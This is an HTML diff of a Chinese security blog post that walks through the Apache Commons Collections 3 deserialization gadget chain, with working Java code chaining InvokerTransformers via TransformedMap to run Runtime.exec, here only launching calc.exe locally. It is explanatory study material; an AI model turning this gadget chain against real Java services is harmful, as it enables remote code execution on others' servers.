@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="白仁的博客" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="CommonsCollections3利用链2015年最大的漏洞莫过于CommonsCollections反序列化漏洞了。它借用了Java反序列化和Apache Commons Collections这一基础类库，从而实现远程命令执行。然后我下面使用的就是Commons Collections3的版本的方法进行构造调用链，记录一下思路。 0x00 CommonsCollections调用链执行首先">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CommonsCollections3利用链">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="CommonsCollections3利用链2015年最大的漏洞莫过于CommonsCollections反序列化漏洞了。它借用了Java反序列化和Apache Commons Collections这一基础类库，从而实现远程命令执行。然后我下面使用的就是Commons Collections3的版本的方法进行构造调用链，记录一下思路。 0x00 CommonsCollections调用链执行首先">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;7.png">
+<meta property="og:updated_time" content="2020-07-19T14:44:44.840Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2020&#x2F;07&#x2F;19&#x2F;CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE&#x2F;1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2020/07/19/CommonsCollections3利用链/"/>
+
+
+
+
+
+  <title>CommonsCollections3利用链 | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CommonsCollections3利用链</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-19T18:18:39+08:00">
+                2020-07-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="CommonsCollections3利用链"><a href="#CommonsCollections3利用链" class="headerlink" title="CommonsCollections3利用链"></a>CommonsCollections3利用链</h1><p>2015年最大的漏洞莫过于CommonsCollections反序列化漏洞了。它借用了Java反序列化和Apache Commons Collections这一基础类库，从而实现远程命令执行。然后我下面使用的就是Commons Collections3的版本的方法进行构造调用链，记录一下思路。</p>
+<h2 id="0x00-CommonsCollections调用链执行"><a href="#0x00-CommonsCollections调用链执行" class="headerlink" title="0x00 CommonsCollections调用链执行"></a>0x00 CommonsCollections调用链执行</h2><p>首先在<a href="https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial上下载打包好的JAR包，新建一个Java项目《Java反序列化》，然后把ysoserial拉进项目文件夹中。基本的项目结构如下：</a></p>
+<p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/1.png" alt></p>
+<p>然后我们上面红圈的地方，右键导入后选择”Add as Library”。然后在弹出的窗口中选择OK就可以啦。这一步的目的是将CommonsCollections3中使用的依赖方法进行引入。</p>
+<blockquote>
+<p>所以要使用这个方法攻击服务器需要服务器上存在CommonsCollections3的环境。</p>
+</blockquote>
+<p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/2.png" alt></p>
+<p>首先贴上调用链执行的代码和效果：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer("exec", new Class[] &#123; String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformeredChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">// 构成调用链：((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null).exec("calc.exe"));</span></span><br><span class="line">        Map normalMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        normalMap.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,<span class="keyword">null</span>,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行这段代码就会成功弹出计算器：</p>
+<p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/3.png" alt></p>
+<h2 id="0x01-CommonsCollections调用链关键点"><a href="#0x01-CommonsCollections调用链关键点" class="headerlink" title="0x01 CommonsCollections调用链关键点"></a>0x01 CommonsCollections调用链关键点</h2><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的<strong>第三方基础库</strong>，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
+<h3 id="TransformedMap类"><a href="#TransformedMap类" class="headerlink" title="TransformedMap类"></a>TransformedMap类</h3><p>TransformedMap类是Apache CommonsCollections 组件中的一个<strong>实现类</strong>。TransformedMap是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由<strong>Transformer类</strong>定义，Transformer在TransformedMap实例化时作为参数传入。</p>
+<p>我们可以通过TransformedMap.decorate()方法，获得一个TransformedMap的实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map transformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>
+
+<p><strong>”当TransformedMap内的key 或者 value发生变化时，就会触发相应的Transformer的transform()方法。另外，还可以使用Transformer数组构造成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列的变换。“</strong></p>
+<blockquote>
+<p>第一句解释了代码执行的触发点：TransformedMap的键值对中的值发生改变时就会触发Transformer类中的transform方法中的代码。</p>
+<p>第二据解释了代码调用链的构造：Transformer数组能构成一条链ChainedTransformer，上面代码触发时会链式地调用ChainedTransformer中的方法。</p>
+</blockquote>
+<p>关于上面这两点为何要这么选择？这个链接进行了很好的解释：<a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a></p>
+<h3 id="InvokerTransformer类"><a href="#InvokerTransformer类" class="headerlink" title="InvokerTransformer类"></a>InvokerTransformer类</h3><p>先贴上InvokerTransformer类的构造函数的定义和它的transform方法的定义：</p>
+<p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/4.png" alt></p>
+<p>我把需要分析的完整（省略了一部分方法）的代码放在下面，注意注释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package org.apache.commons.collections.functors;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import org.apache.commons.collections.FunctorException;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = -8653385846894047688L;</span><br><span class="line">    private final String iMethodName;</span><br><span class="line">    private final Class[] iParamTypes;	</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	</span><br><span class="line">	// InvokerTransformer的构造方法，可以看到三个用来作为反射参数的成员变量（iMethodName、iParamTypes、iArgs）都是通过构造函数直接赋值的，并未作过滤。</span><br><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;	</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                // 调用链触发后会执行transform方法，核心就是这里的利用反射特性去调用iMethodName、iParamTypes和iArgs所指的类的方法</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">            &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">            &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">                throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Java反射特性相关的函数：getClass、getMethod、invoke</p>
+<p>getClass：public final Class getClass()，它返回对对象的Class对象的引用。</p>
+<p>getMethod：Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。getMethod的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。</p>
+<p>invoke：Method类的invoke(Object obj,Object args[])方法接收的参数必须为对象，返回值总是对象。用来执行某个的对象的目标方法。</p>
+</blockquote>
+<h3 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h3><p>由于完成Runtime.getRuntime().exec()的动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方。这时候就需要用到ChainedTransformer进行调用类的串联了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private final Transformer[] iTransformers;// 填充构造后的实例</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);// 调用链，</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-CommonsCollections调用链过程"><a href="#0x02-CommonsCollections调用链过程" class="headerlink" title="0x02 CommonsCollections调用链过程"></a>0x02 CommonsCollections调用链过程</h2><p>如果上面的CommonsCollections中的关键点弄清的话，现在就来解释调用链执行弹出计算器的过程。首先解释代码的第一部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这部分的代码其实就只是构建了一个Transformer类的数组，在transformers数组中定义了四个元素：一个ConstantTransformer对象和三个InvokerTransformer对象。这时候我们复习上面提及的InvokerTransformer类的构造方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">	this.iMethodName = methodName;	</span><br><span class="line">	this.iParamTypes = paramTypes;</span><br><span class="line">	this.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以数组中三个的InvokerTransformer元素，会把其参数列表中的参数依次根据其构造方法赋值给其内部的iMethodName、iParamTypes、iArgs成员变量。</p>
+<blockquote>
+<p>例如第一个InvokerTransformer元素的参数是：”getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}），一共三个参数。所以会调用InvokerTransformer类中具有三个参数的构造方法。然后将”getMethod”赋值给iMethodName、将new Class[]{String.class, Class[].class}赋值给iParamTypes、将new Object[]{“getRuntime”, new Class[0]}）赋值给iArgs。</p>
+</blockquote>
+<p>而这三个成员变量恰恰是transform中动态调用的重要依据。</p>
+<p>然后我们分析第二部分代码，第一步的目的也很清晰，就是用transformers数组来实例化成一个ChainedTransformer：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformeredChain = new ChainedTransformer(transformers);</span><br><span class="line">        // 构成调用链：((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,null,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;test&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>虽然构建一个HashMap类，随便给他设置了一个键值对value-value。</p>
+<blockquote>
+<p>这里写Java的朋友说HashMap其实可以简单理解成python里面的字典。</p>
+</blockquote>
+<p>然后代码通过TransformedMap.decorate()方法，获得一个TransformedMap。随后我们通过entry来遍历整个HashMap获取里面的元素。然后我们只要把其中一个键值对改变，就会像第二篇章说的一样：触发transformeredChain（即transformers数组）中每个元素的transform方法，从而利用transform中的反射获取需要的类方法并因为transformeredChain的多次调用而构成一整条调用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>调用：使用了反射特性；链：根据transformeredChain中的多次调用形成调用链；触发点：TransformedMap中的键值对被改变。</p>
+</blockquote>
+<p>我们可以做个简单实验，只要注释掉重新赋值value的语句entry.setValue(“test”)，代码并不触发：</p>
+<p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/6.png" alt></p>
+<p>去掉注释就会触发调用链重新打开计算器了：</p>
+<p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/7.png" alt></p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里只是梳理了Commons Collections3这条链的前因后果，因为写的头昏眼花啦，这篇等我后面再补齐剩余的内同。然后就是找到Java触发反序列化的点简单，关键是如何<strong>找到可利用的调用链</strong>。这个作为最经典的一条调用链，我就先说到这里了。下次继续补齐并写其他调用链。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/" rel="next" title="Java敏感函数">
+                <i class="fa fa-chevron-left"></i> Java敏感函数
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsCollections3利用链"><span class="nav-number">1.</span> <span class="nav-text">CommonsCollections3利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-CommonsCollections调用链执行"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 CommonsCollections调用链执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CommonsCollections调用链关键点"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 CommonsCollections调用链关键点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-CommonsCollections"><span class="nav-number">1.2.1.</span> <span class="nav-text">Apache CommonsCollections</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformedMap类"><span class="nav-number">1.2.2.</span> <span class="nav-text">TransformedMap类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#InvokerTransformer类"><span class="nav-number">1.2.3.</span> <span class="nav-text">InvokerTransformer类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ChainedTransformer类"><span class="nav-number">1.2.4.</span> <span class="nav-text">ChainedTransformer类</span></a></li></ol></li><li class="nav-item 